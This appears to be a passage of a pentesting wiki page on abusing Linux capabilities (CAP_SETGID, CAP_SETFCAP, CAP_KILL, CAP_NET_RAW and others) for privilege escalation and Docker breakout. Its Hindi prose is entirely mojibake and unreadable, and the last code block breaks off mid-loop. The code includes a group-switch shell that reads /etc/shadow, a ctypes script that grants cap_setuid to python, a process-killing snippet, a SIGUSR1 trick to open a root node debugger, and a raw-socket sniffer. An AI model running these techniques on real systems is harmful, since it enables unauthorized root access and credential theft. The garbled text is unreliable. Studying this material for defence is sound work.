рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдвреВрдВрдв рд▓реЗрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдкрдврд╝рдиреЗ рдпрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ рдЖрдк **рджрд┐рд▓рдЪрд╕реНрдк рд╕рдореВрд╣ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рдореВрд╣ shadow рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ рдЖрдк рдлрд╝рд╛рдЗрд▓ `/etc/shadow` рдкрдврд╝ рд╕рдХреЗрдВ:
```bash
cat /etc/shadow
```
рдпрджрд┐ **docker** рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рддреЛ рдЖрдк **docker рд╕рдореВрд╣** рдХрд╛ **рдирдХрд▓реА рд░реВрдк** рдзрд╛рд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ [**docker socket** рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдПрдВ](./#writable-docker-socket)ред

## CAP\_SETFCAP

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдкрд░ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдкрд╛рдпрдерди рдореЗрдВ рдпрд╣ **рдХреНрд╖рдорддрд╛** рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рд░реВрдЯ рддрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк CAP\_SETFCAP рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ рдирдИ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдпрд╣ рдХреНрд╖рдорддрд╛ рдЦреЛ рджреЗрдВрдЧреЗред
{% endhint %}

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ [SETUID capability](linux-capabilities.md#cap\_setuid) рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХреЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдП рдЬрд╛рдПрдВред

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреНрд╖рдорддрд╛ **CAP\_SETFCAP рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рджреА рдЬрд╛рддреА рд╣реИ Docker рдореЗрдВ**ред рдЖрдк рдпрд╣ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд░рдХреЗ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
рдпрд╣ рдХреНрд╖рдорддрд╛ **рдмрд╛рдЗрдирд░реАрдЬрд╝ рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдХреНрд╖рдорддрд╛ рджреЗрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЙрд▓реНрд▓реЗрдЦрд┐рдд **рдЕрдиреНрдп рдХреНрд╖рдорддрд╛ рдмреНрд░реЗрдХрдЖрдЙрдЯреНрд╕** рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ **рднрд╛рдЧрдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП gdb рдмрд╛рдЗрдирд░реА рдХреЛ CAP\_SYS\_ADMIN рдФрд░ CAP\_SYS\_PTRACE рдХреНрд╖рдорддрд╛рдПрдБ рджреЗрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдкрд╛рдПрдВрдЧреЗ рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди **рдмрд╛рдЗрдирд░реА рдЗрд╕рдХреЗ рдмрд╛рдж рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛ рд╕рдХреЗрдЧреА**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: рдпрд╣ **рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реАрдорд┐рдд рд╕реБрдкрд░рд╕реЗрдЯ** рд╣реИ рдЬреЛ рдереНрд░реЗрдб рдЧреНрд░рд╣рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рднреА рдПрдХ рд╕реАрдорд┐рдд рд╕реБрдкрд░рд╕реЗрдЯ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рдереНрд░реЗрдб рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрдЯ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **CAP\_SETPCAP** рдХреНрд╖рдорддрд╛ рдЕрдкрдиреЗ рдкреНрд░рднрд╛рд╡реА рд╕реЗрдЯ рдореЗрдВ рдирд╣реАрдВ рд░рдЦрддрд╛ рд╣реИред_\
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ Permitted рдХреНрд╖рдорддрд╛рдПрдБ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддреА рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, Docker рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **CAP\_SETPCAP** рднреА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк **рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рднреАрддрд░ рдирдИ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред**\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ: _CAP\_SETPCAP : \[тАж] **рдХреЙрд▓рд┐рдВрдЧ рдереНрд░реЗрдб рдХреЗ рдмрд╛рдЙрдВрдбрд┐рдВрдЧ** рд╕реЗрдЯ рд╕реЗ рдХрд┐рд╕реА рднреА рдХреНрд╖рдорддрд╛ рдХреЛ рдЗрд╕рдХреЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реЗрдЯ рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред_\
рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдХреЗрд╡рд▓ рдмрд╛рдЙрдВрдбрд┐рдВрдЧ рд╕реЗрдЯ рд╕реЗ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдПрдБ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рд╣рдо рдирдИ рдХреНрд╖рдорддрд╛рдПрдБ рдЬреИрд╕реЗ CAP\_SYS\_ADMIN рдпрд╛ CAP\_SYS\_PTRACE рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрдЯ рдореЗрдВ рдирд╣реАрдВ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдП рдЬрд╛ рд╕рдХреЗрдВред**

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рдВрдЪрд╛рд▓рди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `/dev/mem`, `/dev/kmem` рдпрд╛ `/proc/kcore` рддрдХ рдкрд╣реБрдБрдЪ, `mmap_min_addr` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛, `ioperm(2)` рдФрд░ `iopl(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рддрдХ рдкрд╣реБрдБрдЪ, рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдбрд┐рд╕реНрдХ рдХрдорд╛рдВрдб рд╢рд╛рдорд┐рд▓ рд╣реИрдВред `FIBMAP ioctl(2)` рднреА рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд╖рдо рд╣реИ, рдЬрд┐рд╕рдиреЗ [рдЕрддреАрдд рдореЗрдВ](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) рд╕рдорд╕реНрдпрд╛рдПрдБ рдЙрддреНрдкрдиреНрди рдХреА рд╣реИрдВред рдореИрди рдкреЗрдЬ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рдзрд╛рд░рдХ рдХреЛ рдЕрдиреНрдп рдЙрдкрдХрд░рдгреЛрдВ рдкрд░ рд╡рд░реНрдгрдирд╛рддреНрдордХ рд░реВрдк рд╕реЗ `рдбрд┐рд╡рд╛рдЗрд╕-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрдЪрд╛рд▓рди рдХреА рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХрд░рдиреЗ` рдХреА рдЕрдиреБрдорддрд┐ рднреА рджреЗрддрд╛ рд╣реИред

рдпрд╣ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐** рдФрд░ **Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## CAP\_KILL

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдпрд╛ рд╕реЙрдХреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** (рдпрд╛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд┐рд╕реА рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓) рдлрд╝рд╛рдЗрд▓ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдмреИрдХрдбреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рдЙрд╕ рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдиреА рдмреИрдХрдбреЛрд░ рдХреЗ рд╕рд╛рде рдирдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ kill рдХреНрд╖рдорддрд╛рдПрдБ рд╣реИрдВ рдФрд░ рдПрдХ **node рдкреНрд░реЛрдЧреНрд░рд╛рдо рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ** (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ) рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЗрд╕реЗ **рд╕рдВрдХреЗрдд SIGUSR1** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ **node рдбрд┐рдмрдЧрд░** рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рдЖрдк рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреЗ рдорд┐рд╢рди** рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рдЕрдиреБрд╢рд╛рд╕рди рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдкреЗрд╢реЗрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрд╖реНрдгрдХрдЯрд┐рдмрдВрдзреАрдп рдмреИрдардХ рдмрд┐рдВрджреБ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ) рдкрд░ рд╕реБрдирдирд╛ рд╕рдВрднрд╡ рд╣реИред** рдЖрдк рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рдмрдврд╝рд╛ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ **`python`** рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдирдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЛрд░реНрдЯ рд╕реЗ рднреА рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдЧрд╛ (рдХреБрдЫ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)

{% tabs %}
{% tab title="Listen" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="рдЬреЛрдбрд╝реЗрдВ" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХреНрд╖рдорддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ **RAW рдФрд░ PACKET рд╕реЙрдХреЗрдЯ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рдордирдорд╛рдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдФрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдХрдВрдЯреЗрдирд░рд╛рдЗрдЬреНрдб рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдкреИрдХреЗрдЯ рд╕реНрдкреВрдлрд┐рдВрдЧ, рдЯреНрд░реИрдлрд╝рд┐рдХ рдЗрдВрдЬреЗрдХреНрд╢рди, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ред рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЕрднрд┐рдиреЗрддрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдЯреЗрдирд░ рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ рдпрд╛ рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдХрдордЬреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рдкрд░реНрдпрд╛рдкреНрдд рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рд╕реБрд░рдХреНрд╖рд╛ рди рд╣реЛред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **CAP_NET_RAW** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП RAW ICMP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд┐рдВрдЧ рдЬреИрд╕реА рд╕рдВрдЪрд╛рд▓рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред** рдЖрдк рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рдмрдврд╝рд╛ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдмрд╛рдЗрдирд░реА **`tcpdump`** рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдЬрд╛рдирдХрд╛рд░реА рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХреЗрдВрдЧреЗред
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **environment** рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рджреЗ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **`tcpdump`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**Example with binary 2**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг **`python2`** рдХреЛрдб рд╣реИ рдЬреЛ "**lo**" (**localhost**) рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХреЛрдб [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) рд╕реЗ "_The Basics: CAP-NET\_BIND + NET\_RAW_" рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рд╣реИред
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
